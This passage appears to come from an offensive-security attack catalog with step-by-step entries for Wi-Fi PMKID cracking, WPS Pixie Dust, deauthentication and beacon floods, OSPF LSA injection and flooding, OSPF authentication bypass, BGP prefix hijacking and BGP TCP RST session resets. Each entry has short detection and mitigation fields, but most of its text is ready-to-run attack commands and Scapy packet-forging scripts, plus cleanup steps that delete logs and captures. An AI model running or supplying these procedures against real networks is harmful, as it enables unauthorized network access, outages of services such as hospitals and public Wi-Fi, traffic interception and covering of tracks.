- **Attack Steps**: ### 🟢 STEP 1: Install Required ToolsInstall hcxdumptool and hashcat if not already installed:bash<br>sudo apt update && sudo apt install hcxtools hcxdumptool hashcat<br>---### 🟢 STEP 2: Enable Monitor ModeList interfaces:iwconfig → look for wlan0Enable monitor mode:sudo ip link set wlan0 downsudo iw dev wlan0 set type monitorsudo ip link set wlan0 up✅ Or use:sudo airmon-ng start wlan0 → wlan0mon---### 🟢 STEP 3: Identify Nearby Wi-Fi Targets (Optional)sudo airodump-ng wlan0mon✅ Note SSID, BSSID (MAC), and Channel of WPA2 targets---### 🟢 STEP 4: Capture PMKID (Clientless Method)Run:sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1Let it run for 1–3 minutes✅ Tool will send crafted requests and listen for PMKID responses from APsLook for lines like:WPA*01*... → indicates PMKID capturedStop with Ctrl+C once at least one PMKID is captured---### 🟢 STEP 5: Extract Hash from Capture FileConvert .pcapng file to hashcat format:hcxpcapngtool -o pmkid_hash.txt pmkid.pcapngOpen pmkid_hash.txt and confirm line starts with WPA*01*...---### 🟢 STEP 6: Crack PMKID with HashcatRun hashcat:bash<br>hashcat -m 16800 -a 0 pmkid_hash.txt /usr/share/wordlists/rockyou.txt --force<br>• -m 16800 → mode for WPA-PMKID• -a 0 → dictionary attack✅ Wait for successful crack:[Recovered]... password123🧠 Cracking time depends on password strength & wordlist---### 🟢 STEP 7: Connect to Wi-Fi (Post-Crack)Use recovered password to join Wi-Fi via GUI or:nmcli dev wifi connect 'SSID' password 'password123'✅ Full access to LAN/internet---### 🛑 STEP 8: Cleanup• Stop monitor mode:sudo airmon-ng stop wlan0mon• Delete captured files if needed:rm pmkid*• Restart networking:sudo systemctl restart NetworkManager🧠 Note: This attack does not require victims to be online — works in passive environments
- **Detection**: - Monitor for unusual management frame activity- Alert on repeated PMKID requests- Use WIDS/WIPS to detect passive frame scanning- Correlate failed auth attempts post-attack
- **Solution**: - Patch routers to latest firmware- Use WPA3 or WPA2-Enterprise- Enforce long, complex PSKs- Block untrusted MACs- Rotate Wi-Fi keys frequently
- **Tags**: #PMKIDAttack #WPA2Crack #Hashcat #ClientlessWiFiCrack #hcxdumptool #RedTeamWiFi #80211attack

## WPS PIN Brute Force (Pixie Dust Attack)

- **Attack Type**: WPS Offline PIN Brute Force (Local & Fast)
- **Target**: Consumer Wi-Fi Routers<brIoT Hubs<brLegacy WPS-Enabled Access Points
- **Vulnerability**: - Weak RNG for Diffie-Hellman keys- Enabled WPS PIN authentication- Static PIN generation- Poor WPS timeout handling
- **MITRE**: T1557 – Man-in-the-MiddleT1110.004 – Credential Cracking (Offline via PIN RNG flaws)T1040 – Network Traffic Capture
- **Impact**: - Immediate disclosure of WPA2 password- Full wireless access- Potential LAN compromise- Zero interaction needed from victim
- **Tools**: ✅ Kali Linux or Parrot OS✅ External USB Wi-Fi adapter supporting monitor & injection mode (e.g., Alfa AWUS036NHA)✅ reaver (WPS PIN attack tool)✅ pixiewps (offline attack against weak RNGs)✅ wash (WPS scan tool)✅ Optional: airmon-ng, airodump-ng, Wireshark
- **Scenario**: This simulation demonstrates how attackers exploit a weakness in Wi-Fi Protected Setup (WPS) to recover a WPA/WPA2 PSK without needing the handshake or client deauthentication. WPS is designed to simplify wireless setup using an 8-digit PIN, but many routers implement it insecurely. The Pixie Dust Attack exploits a vulnerability in the random number generation used during the key exchange in some WPS implementations. If successful, the attack can recover the WPS PIN and derive the Wi-Fi password in seconds to minutes — without any brute force or wordlist. This attack requires no connected clients and is particularly dangerous for legacy routers or cheap IoT access points.
- **Attack Steps**: ### 🟢 STEP 1: Environment Preparation• Boot into Kali Linux• Plug in external Wi-Fi adapter (must support monitor mode and injection)✅ Check interface: iwconfig → should show wlan0---### 🟢 STEP 2: Enable Monitor Modesudo airmon-ng start wlan0✅ Creates wlan0mon---### 🟢 STEP 3: Scan for WPS-Enabled APsUse wash to scan:sudo wash -i wlan0monLook for:• WPS Version• Locked = No• Signal = Strong (above -70 dBm)✅ Note BSSID, Channel, and SSID of target---### 🟢 STEP 4: Launch Pixie Dust Attack with ReaverStart attack:sudo reaver -i wlan0mon -b <BSSID> -c <channel> -vvv -K 1 -fExplanation:• -K 1 = enables Pixie Dust attack• -f = ignores checksum errors✅ Reaver initiates a WPS handshake, captures public keys, and calls pixiewpsIf vulnerable:<br>[+] Pixie Dust attack complete.<br>[+] WPS PIN: 12345670<br>[+] WPA PSK: qwerty12345<br>[+] AP SSID: Home_WiFi<br>🧠 This works only if router has bad RNG for WPS---### 🟢 STEP 5: Connect to the Wi-Fi NetworkUse the recovered WPA PSK:nmcli dev wifi connect 'Home_WiFi' password 'qwerty12345'✅ Full access to target network---### 🛑 STEP 6: Cleanup• Stop monitor mode:sudo airmon-ng stop wlan0mon• Restart networking:sudo systemctl restart NetworkManager• Clear any WPS logs:rm reaver*🧠 Tips:• Not all routers are vulnerable to Pixie Dust• Use close range to improve success rate• Attack is stealthy compared to deauth methods
- **Detection**: - Monitor logs for WPS brute force attempts- IDS/IPS alerts for Reaver-like behavior- Alert if WPS is still enabled on access points
- **Solution**: - Disable WPS permanently (recommended)- Update router firmware (patch Pixie Dust vulns)- Enforce WPA2/3 with strong PSK- Monitor for suspicious probe/auth activity
- **Tags**: #PixieDust #WPSAttack #Reaver #WiFiCrack #CredentialTheft #OfflineWiFiAttack #RedTeamWireless

## Deauthentication Attack (DoS)

- **Attack Type**: Wireless Denial-of-Service (Layer 2 Disruption)
- **Target**: Public Wi-Fi<brCorporate APs<brUniversities<brHospitals<brHotels
- **Vulnerability**: - Unauthenticated 802.11 management frames- Lack of WPA3 Protected Management Frames (PMF)- No WIDS/WIPS in place
- **MITRE**: T1498.001 – Network Denial of Service: Wireless DoST1557.002 – Man-in-the-Middle (via forced disconnect)
- **Impact**: - Temporary or persistent network outage- Disruption of services and productivity- Client frustration- Enables further MITM or Evil Twin attacks
- **Tools**: ✅ Kali Linux or Parrot OS✅ External USB Wi-Fi adapter supporting monitor + injection (e.g., Alfa AWUS036ACH)✅ airmon-ng (enable monitor mode)✅ aireplay-ng (send deauth frames)✅ airodump-ng (scan targets)✅ Optional: mdk4, Wireshark, Bettercap
- **Scenario**: This simulation demonstrates a Deauthentication Attack, a simple but powerful layer 2 denial-of-service technique targeting Wi-Fi networks. Attackers flood the air with spoofed deauthentication frames, which forcibly disconnect clients from their Access Points (APs). Since 802.11 deauth frames are unencrypted and unauthenticated, anyone can spoof them — no credentials or association needed. This attack causes temporary or persistent Wi-Fi outages, disrupts connectivity, or can be used as a prelude to Evil Twin or Man-in-the-Middle (MITM) attacks. It works on open, WPA2, and even WPA3 networks. Effective in corporate, public, or educational environments where availability is critical.
- **Attack Steps**: ### 🟢 STEP 1: Environment Setup• Boot Kali Linux• Plug in compatible Wi-Fi adapter✅ Check adapter: iwconfig → should show wlan0---### 🟢 STEP 2: Enable Monitor Modesudo airmon-ng start wlan0✅ Creates interface: wlan0mon---### 🟢 STEP 3: Scan for Wi-Fi TargetsUse airodump-ng:sudo airodump-ng wlan0monIdentify:• BSSID of Access Point• Channel (CH)• Connected clients (STATION field)✅ Choose target AP and client---### 🟢 STEP 4: Deauthentication Attack (Targeted Client)Run:sudo aireplay-ng --deauth 10 -a <AP-BSSID> -c <CLIENT-MAC> wlan0mon• Sends 10 deauth packets to single client---### 🟢 STEP 5: Deauthentication Attack (All Clients on AP)sudo aireplay-ng --deauth 1000 -a <AP-BSSID> wlan0mon✅ All clients disconnected repeatedly---### 🟢 STEP 6: Continuous Deauth FloodUse mdk4 for non-stop attack:sudo mdk4 wlan0mon d -b blacklist.txt -c <channel>Create blacklist.txt with:<BSSID> (one per line)✅ This causes total wireless outage for target AP---### 🟢 STEP 7: Optional Sniffing or MITMDuring attack:• Victims may connect to rogue AP• Use tools like Bettercap or Wireshark for session hijacking or phishing---### 🛑 STEP 8: Cleanup• Stop monitor mode:sudo airmon-ng stop wlan0mon• Restart networking:sudo systemctl restart NetworkManager• Delete logs or captures🧠 Tips:• Legal only in lab environments• Can trigger IDS/IPS• Best used before Evil Twin or PMKID attack
- **Detection**: - WIDS/WIPS alerts for repeated deauth frames- Wireshark capture shows high volume of 802.11 deauths- Alert on excessive disconnect/reconnects
- **Solution**: - Enable WPA3 or WPA2 PMF (Protected Management Frames)- Use WIDS/WIPS like Cisco WLC, Aruba, or Ubiquiti Defense- Monitor for unusual disconnect spikes- Disable open Wi-Fi wherever possible
- **Tags**: #DeauthAttack #WiFiDoS #80211Hacking #Layer2DoS #WirelessRedTeam #MITMPrecursor #mdk4 #aircrack

## Beacon Flood (Fake AP Overload)

- **Attack Type**: Wireless Denial-of-Service (Beacon Storm)
- **Target**: Public Wi-Fi Clients<brPhones/Tablets<brRouters with weak AP detection<brSurvey Tools
- **Vulnerability**: - Lack of frame validation- No SSID spoofing protection- Beacon frame unauthenticated- OSes not rate-limiting SSID display list
- **MITRE**: T1498.001 – Network Denial of Service: Wireless DoST1557.002 – Adversary-in-the-Middle (as prelude to MITM)
- **Impact**: - DoS via Wi-Fi UI overload- Confusion from fake SSIDs- Failed onboarding of real APs- Potential social engineering lure- Device crashes in rare cases
- **Tools**: ✅ Kali Linux / Parrot OS✅ External USB Wi-Fi adapter with monitor + injection support (e.g., Alfa AWUS036ACH)✅ mdk4 (beacon flooding tool)✅ Optional: aircrack-ng, airodump-ng, Wireshark for validation✅ Custom SSID list (text file of fake network names)
- **Scenario**: This simulation showcases the Beacon Flood Attack, where an attacker sends out a flood of fake SSID beacon frames, each broadcasting a unique, bogus network name. These beacons mimic Access Points (APs), tricking nearby devices into overloading their Wi-Fi lists, potentially causing freezes, UI lag, or crashes. Beacon flooding also confuses users by listing fake networks like “Free_Public_WiFi” or “Corporate_WiFi_2”. This does not require any connected clients and can be used as social engineering bait or to sabotage wireless surveys, rogue AP detection tools, or wireless onboarding. It's frequently used in wireless red teaming or denial-of-service demonstrations.
- **Attack Steps**: ### 🟢 STEP 1: Lab Setup• Boot Kali Linux• Plug in external USB Wi-Fi adapter✅ Confirm interface: iwconfig (look for wlan0)---### 🟢 STEP 2: Enable Monitor ModeRun:sudo airmon-ng start wlan0✅ Creates monitor interface: wlan0mon---### 🟢 STEP 3: Create Fake SSID ListCreate fake_aps.txt:<br>Free_Public_WiFi<br>Corporate_Guest<br>Police_WiFi<br>Hotel_5G_Auth<br>Campus_Wireless<br>Starbucks_WiFi<br>VirusHotspot<br>FakeXfinity<br>OfficeBackup_AP<br>HiddenProbe_AP<br>✅ You can add 100+ entries---### 🟢 STEP 4: Launch Beacon FloodRun:sudo mdk4 wlan0mon b -f fake_aps.txt -s 100Explanation:• b → beacon flood mode• -f → path to fake SSID list• -s → delay (in ms) between beacons✅ Nearby devices now detect dozens or hundreds of fake APs---### 🟢 STEP 5: Observe Impact• Open Wi-Fi list on target devices:→ Sluggish UI→ Fake SSIDs appear→ Some devices may freeze or auto-connect (if known SSIDs used)• Run airodump-ng wlan0mon on another terminal:→ See spoofed BSSIDs (random MACs), same/different channels🧠 Can be used as bait for Evil Twin, phishing, or redirect---### 🟢 STEP 6: Advanced Usage (Dynamic SSID Generation)Use:sudo mdk4 wlan0mon b -s 50→ Random SSIDs auto-generated in real time✅ Flood never ends and no list file required---### 🛑 STEP 7: Cleanup• Stop beacon flood:Ctrl+C• Stop monitor mode:sudo airmon-ng stop wlan0mon• Restart networking:sudo systemctl restart NetworkManager🧠 Note:• Attack does not require handshake, client, or credentials• Fully passive targets still affected• Very hard to filter by signature without WIDS
- **Detection**: - Analyze 802.11 beacon frame volume via Wireshark- Look for numerous SSIDs on same BSSID prefix or channel- Enable WIDS alerting on high beacon rate- UI logs show freeze or slow SSID population
- **Solution**: - Enable WIDS/WIPS (e.g., Aruba, Cisco, Ubiquiti)- Suppress display of unknown/open SSIDs- Filter out spoofed BSSIDs in detection tools- Disable auto-connect to open SSIDs- Use SSID whitelisting policies
- **Tags**: #BeaconFlood #SSIDSpam #WiFiDoS #WirelessRedTeam #FakeAP #mdk4 #SSIDOverload #DenialOfService

## OSPF Route Injection (Fake LSA)

- **Attack Type**: Routing Protocol Manipulation / Route Hijack
- **Target**: Corporate Routers<brCampus Backbone<brISP Core<brCloud IaaS Platforms
- **Vulnerability**: - Lack of OSPF authentication- Flat OSPF area (0) exposure- Accepting unverified LSAs- No route origin validation
- **MITRE**: T1557.002 – Adversary-in-the-MiddleT1565.001 – Network Traffic ManipulationT1040 – Network Sniffing
- **Impact**: - Full path redirection- MITM via rogue gateway- Route blackholing / segmentation bypass- Loss of availability / traffic hijack
- **Tools**: ✅ GNS3 or EVE-NG (for lab)✅ Kali Linux or Ubuntu (attacker)✅ scapy (for custom LSA injection)✅ ospf6d / quagga or frrouting (to emulate OSPF router)✅ Target router/switch supporting OSPF (Cisco, Juniper, etc.)✅ Wireshark (to analyze OSPF traffic)✅ Virtual network with OSPF neighbors
- **Scenario**: This simulation demonstrates how an attacker can exploit Open Shortest Path First (OSPF) routing protocol to inject fake Link-State Advertisements (LSAs) into a target network. If OSPF authentication is misconfigured (null or weak), a rogue device can form an adjacency and advertise malicious routes (e.g., to a fake gateway or blackhole), misleading routers into rerouting traffic. This attack can be used to achieve Man-in-the-Middle (MITM), traffic blackholing, or network segmentation bypass in corporate or ISP networks. It is dangerous in flat or missegmented OSPF areas and especially if area 0 is exposed.
- **Attack Steps**: ### 🟢 STEP 1: Setup a Virtual OSPF LabUse GNS3 or EVE-NG to simulate:• 2 legitimate OSPF routers (R1, R2)• 1 attacker machine (Kali Linux)✅ Connect them via Ethernet switch in same broadcast domainEnsure OSPF is enabled and routers are exchanging LSAs normally---### 🟢 STEP 2: Observe OSPF TrafficOn attacker machine:sudo wiresharkFilter: ospf✅ Confirm Type 1 (Router LSA) and Type 2 (Network LSA) exchangesNote: Router IDs and area IDs---### 🟢 STEP 3: Disable OSPF Authentication (if needed)✅ Ensure no MD5/password is configured on OSPF interfacesOn Cisco:no ip ospf authentication🧠 This makes the network vulnerable to rogue LSA injection---### 🟢 STEP 4: Craft a Fake LSA Using ScapyInstall required modules:sudo pip install scapyThen create script fake_lsa.py:python<br>from scapy.all import *<br>from scapy.contrib.ospf import *<br><br>lsa = OSPF_LSA_Hdr(ls_age=1, ls_type=1, link_state_id="10.0.0.0", adv_router="1.1.1.1")<br>pkt = IP(dst="224.0.0.5")/OSPF_Hdr(router="2.2.2.2")/OSPF_DBDesc()/lsa<br>send(pkt, iface="eth0")<br>✅ This advertises a fake route to 10.0.0.0/24 via malicious router 2.2.2.2---### 🟢 STEP 5: Send the Fake LSA to the NetworkRun the script:sudo python3 fake_lsa.pyUse Wireshark to verify:• LSA was received by other routers• New route installed on routing table---### 🟢 STEP 6: Observe Impact• Routers update routing table• Packets for 10.0.0.0/24 now go to attacker's interface✅ You’ve successfully hijacked a route🧠 You can now:• MITM traffic• Blackhole packets• Redirect to malicious web server---### 🛑 STEP 7: Cleanup• Stop script• Restart routers• Re-enable OSPF authentication:ip ospf authentication message-digestip ospf message-digest-key 1 md5 <password>🧠 Tip: OSPFv2 uses plaintext by default unless configuredOSPFv3 (IPv6) supports stronger security but still spoofable without AH/IPSec
- **Detection**: - Monitor OSPF LSA logs for unknown router IDs- Alert on unexpected routing changes- Use OSPF authentication logs- Deploy NetFlow or Wireshark for route monitoring
- **Solution**: - Enforce OSPF MD5 or SHA authentication- Isolate OSPF areas with strict ACLs- Use BFD for neighbor validation- Monitor for OSPF anomalies in NMS/IDS- Use Passive Interfaces when not routing
- **Tags**: #OSPFInjection #FakeLSA #RoutingAttack #MITM #RouteHijack #BGP_OSPF_Risk #NetworkRedTeam #OSPFv2Exploit

## OSPF Spoofed Router ID / LSA Flood

- **Attack Type**: Routing Protocol DoS / Routing Table Pollution
- **Target**: Core Routers<brEdge Routers<brCampus Gateways<brProvider Infrastructure
- **Vulnerability**: - No LSA authentication- Flat OSPF topology (no area segmentation)- LSAs accepted without verification
- **MITRE**: T1498 – Network Denial of ServiceT1557.002 – Adversary-in-the-Middle via RoutingT1565.001 – Network Traffic Manipulation
- **Impact**: - Routing table instability- CPU exhaustion on routers- Traffic rerouting or blackholing- Full OSPF process failure or router crash
- **Tools**: ✅ Kali Linux or Ubuntu (attacker)✅ GNS3 or EVE-NG (lab routers)✅ Python + Scapy + scapy.contrib.ospf✅ Wireshark (to verify LSA injections)✅ quagga or frrouting (optional for emulated routers)✅ iptables to block route recovery after flood
- **Scenario**: This simulation explains how an attacker can perform a denial-of-service or routing disruption in an OSPF network by spoofing multiple router IDs and flooding the network with fake Link-State Advertisements (LSAs). The goal is to overwhelm the LSDB (Link-State Database) and cause routing instability, CPU spikes, or even router crashes. Since OSPF does not authenticate LSAs by default, an attacker can send falsified LSAs with made-up router IDs, tricking routers into updating their tables with bogus entries. This attack is especially damaging in flat OSPF areas (e.g., area 0) with no route filtering or MD5 authentication. It is commonly used to disrupt routing behavior or cover traffic redirection attacks.
- **Attack Steps**: ### 🟢 STEP 1: Lab Environment SetupUse GNS3 or EVE-NG to simulate:• Two legitimate routers (R1 and R2)• One attacker host (Kali Linux)Connect all to a common Ethernet segment so they participate in the same OSPF area---### 🟢 STEP 2: Enable OSPF on R1 and R2Ensure both routers exchange OSPF LSAsOn Cisco:router ospf 1network 192.168.1.0 0.0.0.255 area 0Verify routes with:show ip ospf database---### 🟢 STEP 3: Confirm No OSPF AuthenticationOn both routers:show ip ospf interface✅ Ensure "Authentication: None"🧠 If authentication is enabled, disable it for this test---### 🟢 STEP 4: Install Python RequirementsOn attacker machine:sudo pip install scapycd /usr/lib/python3/dist-packages/scapy/contrib && sudo wget https://raw.githubusercontent.com/secdev/scapy/master/scapy/contrib/ospf.py✅ Enables OSPF packet crafting---### 🟢 STEP 5: Craft Spoofed LSA Flood ScriptCreate lsa_flood.py:python<br>from scapy.all import *<br>from scapy.contrib.ospf import *<br><br>for i in range(1, 101):<br> fake_id = f"10.0.{i}.1"<br> lsa = OSPF_LSA_Hdr(ls_type=1, link_state_id=fake_id, adv_router=fake_id, ls_seqnum=0x80000001)<br> ospf_pkt = IP(dst="224.0.0.5")/OSPF_Hdr(router=fake_id, area="0.0.0.0")/OSPF_DBDesc()/lsa<br> send(ospf_pkt, iface="eth0")<br>This sends 100 fake Router LSAs with different Router IDs---### 🟢 STEP 6: Execute Floodsudo python3 lsa_flood.py✅ Target routers will process each LSA and update their LSDBCheck with:show ip ospf database router🧠 You’ll see entries from fake router IDs like 10.0.1.1, 10.0.2.1, etc.---### 🟢 STEP 7: Observe Impact• CPU usage on R1/R2 spikes• Routing table flaps or becomes unstable• Potential crash or reboot• Real routes may be overridden or dropped---### 🛑 STEP 8: Cleanup• Reboot routers or clear LSDB manuallyclear ip ospf process• Re-enable OSPF MD5 authenticationip ospf authentication message-digest🧠 Optionally block attacker using ACL:ip access-list standard BLOCK_ATTACKERdeny host <attacker-IP>permit anyinterface Xip access-group BLOCK_ATTACKER in
- **Detection**: - Monitor OSPF LSA logs for excessive unique router IDs- Use Wireshark to see fake LSA source IPs- Check routing logs for flaps or route changes
- **Solution**: - Enforce OSPF authentication (MD5, SHA)- Use passive interfaces on edge connections- Limit LSAs via route filters- Isolate OSPF areas with strict ACLs- Monitor LSDB size and router CPU periodically
- **Tags**: #OSPF #LSAFlood #RoutingAttack #DoS #ScapyOSPF #LinkStateAbuse #RedTeamNetwork #RouterIDspoof

## OSPF Authentication Bypass

- **Attack Type**: Routing Protocol Manipulation / Spoofing
- **Target**: Enterprise Core<brBranch Routers<brCampus Edge<brPublic Cloud VM routers
- **Vulnerability**: - No OSPF authentication- Use of plaintext/simple password- Misconfigured router ACLs- Exposed interfaces
- **MITRE**: T1557.002 – Adversary-in-the-Middle via RoutingT1565.001 – Network Traffic Manipulation
- **Impact**: - Unauthorized router joins- Fake routes injected- Rerouting of critical services- Blackhole or MITM setups- Instability in routing process
- **Tools**: ✅ Kali Linux / Ubuntu (attacker)✅ scapy (to craft OSPF packets)✅ Wireshark (for sniffing OSPF LSAs)✅ GNS3 / EVE-NG (optional for lab emulation)✅ Quagga / FRRouting (optional for emulating routers)✅ Python with scapy.contrib.ospf
- **Scenario**: This simulation demonstrates how an attacker can bypass weak or misconfigured OSPF authentication to inject unauthorized LSAs or form rogue adjacencies with internal routers. OSPF supports various authentication modes: Null (none), Plaintext (simple password), and MD5. If OSPF is running with no auth or reused/shared simple passwords, attackers can easily inject fake LSAs, form neighbor relationships, or manipulate the routing table. This can lead to MITM, route hijacking, or blackhole attacks. This attack is effective in networks that expose OSPF interfaces on internal VLANs or lack strict access control.
- **Attack Steps**: ### 🟢 STEP 1: Lab Setup• Use GNS3/EVE-NG to simulate: - Router R1 (legitimate) - Router R2 (legitimate neighbor) - Kali Linux (attacker)All devices connected on same OSPF-enabled VLAN✅ Ensure routers are configured for OSPF and exchanging LSAs---### 🟢 STEP 2: Check Authentication ModeOn routers (Cisco):show ip ospf interfaceLook for Authentication: None or Simple Password🧠 If no authentication or weak auth is used, the network is vulnerable---### 🟢 STEP 3: Capture OSPF PacketsOn Kali:sudo wireshark → Filter: ospf✅ Observe hello packets, LSAs, router IDs, area IDOptional:sudo tcpdump -i eth0 proto ospf---### 🟢 STEP 4: Craft OSPF Hello Packet to Join NetworkPython script ospf_bypass.py:python<br>from scapy.all import *<br>from scapy.contrib.ospf import *<br><br>hello = OSPF_Hello(router="10.1.1.100", area="0.0.0.0", network_mask="255.255.255.0", hello_interval=10)<br>pkt = IP(dst="224.0.0.5")/OSPF_Hdr(router="10.1.1.100")/hello<br>send(pkt, iface="eth0")<br>✅ Sends an OSPF Hello from spoofed router---### 🟢 STEP 5: Form Unauthorized Adjacency• If routers accept Hello packet, attacker becomes a neighbor• Use Wireshark to confirm adjacency formed• You now have influence over LSDB---### 🟢 STEP 6: Inject Malicious LSA (e.g., Route to MITM Gateway)Extend script to inject LSA:python<br>lsa = OSPF_LSA_Hdr(ls_type=1, link_state_id="192.168.99.0", adv_router="10.1.1.100", ls_seqnum=0x80000001)<br>pkt2 = IP(dst="224.0.0.5")/OSPF_Hdr(router="10.1.1.100")/lsa<br>send(pkt2, iface="eth0")<br>✅ Fake route added to victim router's table🧠 Use this to blackhole or reroute sensitive traffic---### 🛑 STEP 7: Cleanup• Stop packet injection• Reboot routers or clear OSPF LSDB:clear ip ospf process• Remove unauthorized neighborsOptional mitigation:• Apply ACL to block attacker IP• Enable OSPF MD5/SHA authentication🧠 Note: Simple password auth can be sniffed in plaintext in Wireshark
- **Detection**: - Monitor OSPF adjacency logs for unknown neighbors- Check for abnormal LSA entries- Use Wireshark to identify rogue router IDs and Hello packets
- **Solution**: - Always use OSPF MD5/SHA authentication- Restrict OSPF interfaces with ACLs- Enable passive-interface for non-participating links- Implement router hardening and monitoring policies
- **Tags**: #OSPFBypass #RoutingSpoof #LinkStateExploit #NetworkDoS #RoutingMITM #OSPFWeakAuth #RedTeamInfra

## BGP Prefix Hijacking

- **Attack Type**: Routing Protocol Manipulation / Hijacking
- **Target**: ISP Routers<brInternet Exchange Points<brCloud Gateways<brAutonomous Systems
- **Vulnerability**: - Lack of prefix filtering- No RPKI/ROA validation- Acceptance of third-party prefix advertisements- Missing AS-PATH or prefix-list filters
- **MITRE**: T1565.001 – Network Traffic ManipulationT1584 – Compromise InfrastructureT1583.004 – Hijack Network Traffic Flow
- **Impact**: - Redirection of internet traffic- Blackhole or sinkhole legitimate services- Man-in-the-middle attacks on any IP traffic- Downtime or service disruption for large subnets
- **Tools**: ✅ GNS3 or EVE-NG (to simulate ASes)✅ BGP-capable routers (FRRouting, Quagga, or Cisco IOS)✅ Kali Linux or Ubuntu (attacker)✅ Wireshark (BGP packet capture)✅ IP range to simulate hijacking✅ BGP Peering Lab Setup✅ (Optional) BGPMon / RIPEstat for detection validation
- **Scenario**: This simulation illustrates how an attacker, with control over a malicious BGP-speaking router, can perform BGP prefix hijacking to falsely advertise ownership of IP prefixes belonging to another AS (Autonomous System). If upstream ISPs or IXPs (Internet Exchange Points) do not strictly filter BGP advertisements, the fake route can propagate globally, causing traffic to be rerouted, blackholed, or intercepted. This attack has been used in real-world incidents to hijack cryptocurrencies, perform surveillance, or disrupt service delivery. This is commonly simulated in BGP-enabled lab environments, ISPs, or cloud-based routers.
- **Attack Steps**: ### 🟢 STEP 1: Lab Topology SetupUse GNS3 or EVE-NG to simulate:• AS100: Legitimate AS (Router R1)• AS200: Victim AS (Router R2 advertising 203.0.113.0/24)• AS666: Attacker AS (Router R3)✅ Ensure all routers are running FRRouting or Cisco IOS with BGP support---### 🟢 STEP 2: Configure Legitimate BGP AdvertisementOn R2 (AS200):router bgp 200network 203.0.113.0 mask 255.255.255.0neighbor <ISP> remote-as 100✅ Prefix is now correctly announced to the world---### 🟢 STEP 3: Configure Attacker Router (AS666) to Hijack PrefixOn R3:router bgp 666network 203.0.113.0 mask 255.255.255.0neighbor <ISP> remote-as 100✅ You are now falsely claiming the victim’s prefix🧠 Note: Even though R3 doesn’t own this IP block, if the upstream ISP or peer does not validate ROAs, it will accept and propagate the route---### 🟢 STEP 4: Observe Hijacked Routing BehaviorOn R1 (upstream/IXP):show ip bgp✅ R1 now sees multiple routes for 203.0.113.0/24✅ If attacker advertises shorter path or more specific prefix (e.g., /25), it gets preferred---### 🟢 STEP 5: Simulate ImpactOn Kali or a client router:• Try to ping 203.0.113.10✅ Packet goes via attacker’s router (R3) instead of R2• Setup Wireshark on R3 and observe captured traffic✅ MITM or blackholing achievedOptional:• Use tcpdump to verify intercepted TCP/UDP• Setup DNS or HTTP spoofing for advanced hijack---### 🛑 STEP 6: CleanupOn attacker router R3:no network 203.0.113.0 mask 255.255.255.0• Clear BGP session:clear ip bgp *✅ Propagation will stop within minutes, depending on TTL🧠 Tip: Use RIPEstat or BGPMon to confirm prefix propagation during simulation
- **Detection**: - Monitor BGP announcements via BGPMon / RIPE RIS / RouteViews- Alert on origin AS mismatch or unexpected AS paths- Review IXP BGP logs and BGP session changes
- **Solution**: - Enforce strict prefix filtering at edge- Use RPKI with ROA validation (RFC 6480)- Implement BGP max-prefix and AS-PATH filters- Enable BGP session logging and anomaly alerts- Use IRR databases for peer verification
- **Tags**: #BGPHijack #PrefixHijacking #BGPAbuse #RPKI #RouteManipulation #InternetInfrastructure #RedTeamRouting

## BGP Route Flapping / Session Reset

- **Attack Type**: Routing Protocol Abuse / BGP Session Disruption
- **Target**: ISP Routers<brPublic Peering Routers<brCloud Edge BGP Appliances
- **Vulnerability**: - Lack of TCP protection- No TTL or MD5 protection for BGP- Overly permissive BGP peers- Missing prefix dampening policies
- **MITRE**: T1498.003 – Application Layer DoST1565.001 – Network Traffic ManipulationT1583.004 – Hijack Network Traffic
- **Impact**: - Session reset = route loss- Continuous flapping = instability- Prefix dampening = false blackhole- Potential route leak or MITM through session takeover
- **Tools**: ✅ GNS3 or EVE-NG (to simulate routers)✅ BGP-capable routers (FRRouting, Quagga, Cisco IOS)✅ Kali Linux / Parrot OS (attacker)✅ Wireshark (to monitor BGP session)✅ Scapy (for TCP RST injection)✅ BGP route-monitoring tools like BGPMon / RIPE RIS / ExaBGP
- **Scenario**: This simulation demonstrates how an attacker can disrupt BGP routing stability by either flapping advertised prefixes (rapidly withdrawing and re-announcing them) or by sending forged TCP RST packets to reset BGP sessions between legitimate routers. These attacks exploit the lack of encryption or session-layer protection in traditional BGP setups (TCP port 179) and are particularly effective in environments where routers are reachable over public or internal network segments. This can cause global route instability, increased convergence times, or denial of service for prefixes.
- **Attack Steps**: ### 🟢 STEP 1: Lab SetupSimulate three routers in GNS3:• R1: ISP Router (AS65001)• R2: Customer Router (AS65002)• R3: Attacker or rogue BGP peerConnect all to the same virtual LAN (Ethernet switch)Configure R1 and R2 for BGP peering:On R1:router bgp 65001neighbor 192.168.1.2 remote-as 65002On R2:router bgp 65002neighbor 192.168.1.1 remote-as 65001✅ Ensure BGP session is established---### 🟢 STEP 2: Simulate Route FlappingOn R2:network 10.10.10.0 mask 255.255.255.0clear ip bgp * (to withdraw route)Wait 5 seconds, then re-announce:router bgp 65002network 10.10.10.0 mask 255.255.255.0Repeat this 10-15 times✅ Each flap causes route reconvergence and instability🧠 In real-world attacks, this behavior can be automated via scripts (e.g., ExaBGP) to flap thousands of routes---### 🟢 STEP 3: Observe Impact on Upstream RouterOn R1:show ip bgp or show bgp ipv4 unicast✅ Prefix 10.10.10.0/24 appears/disappears repeatedly✅ Flapping threshold exceeded = route dampening---### 🟢 STEP 4: Simulate BGP Session Reset via TCP RST InjectionOn attacker machine:Use Wireshark to capture the existing BGP session:Filter: tcp.port == 179Note source IPs, ports, and TCP sequence numbers🧠 BGP runs over TCP, so a spoofed TCP RST with correct seq number can reset the sessionInstall Scapy:sudo pip install scapyCreate script rst_inject.py:python<br>from scapy.all import *<br><br>ip = IP(src="192.168.1.2", dst="192.168.1.1")<br>tcp = TCP(sport=179, dport=179, flags="R", seq=<correct_seq>)<br>pkt = ip/tcp<br>send(pkt)<br>✅ Send forged RST from client side---### 🟢 STEP 5: Confirm Session ResetOn R1:show ip bgp summary✅ BGP session with R2 has dropped✅ Routing table entries withdrawnRepeat from R2 to R1 to ensure bi-directional disruption---### 🛑 STEP 6: Cleanup• Stop flapping routes• Clear injected sessions• Reestablish BGP peering:clear ip bgp *Optional:• Apply filters to monitor BGP session stability• Enable logs for route churn and session resets
- **Detection**: - Monitor BGP logs for session resets- Enable logging on all BGP state changes- Monitor route churn thresholds- Use Wireshark to inspect TCP-level resets
- **Solution**: - Enable BGP TTL security (GTSM)- Configure TCP MD5 signatures (RFC 2385)- Apply prefix dampening (BGP flap control)- Filter peer IPs with strict ACLs- Use secure transport (e.g., TCP-AO or IPsec tunnels)
